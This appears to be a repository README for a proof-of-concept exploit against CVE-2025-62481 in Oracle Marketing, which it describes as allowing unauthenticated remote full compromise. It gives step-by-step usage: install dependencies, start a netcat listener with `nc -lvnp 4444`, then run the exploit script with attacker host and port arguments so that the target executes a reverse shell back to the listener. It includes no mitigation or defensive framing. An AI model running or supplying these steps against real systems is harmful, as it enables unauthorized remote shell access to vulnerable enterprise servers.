# Oracle Marketing Exploit - CVE-2025-62481

## Overview
This repository contains a proof-of-concept exploit for CVE-2025-62481, a critical vulnerability in Oracle Marketing versions 12.2.3 through 12.2.14. The exploit allows unauthenticated remote attackers to achieve full compromise of the affected system via HTTP, impacting confidentiality, integrity, and availability.


## Requirements
- Python 3.8+
- Libraries: requests, urllib3
- Target: Oracle E-Business Suite with Oracle Marketing 12.2.3-12.2.14 exposed via HTTP/HTTPS
- Network access to the target's port (default 80/443)


## Usage

1. **Install dependencies**
   ```
   pip install -r requirements.txt
   ```
   
2. **Set Up the Listener with Netcat**
   - Install netcat if not already present:
     ```
     sudo apt install netcat # On Debian/Ubuntu
     sudo yum install nc # On CentOS/RHEL
     ```
   - Start the listener on your chosen IP and port. For example, if you specified `--lhost 192.168.1.100` and `--lport 4444` in the exploit:
     ```
     nc -lvnp 4444
     ```
   - The listener will wait for the incoming connection from the target.

3. **Run the Exploit**
   Execute the exploit script with the appropriate arguments, ensuring `--lhost` and `--lport` match the listener’s IP and port:
   ```
   python cve-2025-62481.py --target http://example.com:8080/marketing/admin --lhost 192.168.1.100 --lport 4444
   ```
   The exploit sends a payload to the target, instructing it to connect back to `192.168.1.100:4444`.

4. **Receive the Shell**
   - Once the exploit succeeds, the target system executes the reverse shell payload, connecting to your listener.
   - In the netcat terminal, you’ll see a connection established, and you’ll be presented with a shell prompt (e.g., `bash` or `sh`) from the target system.
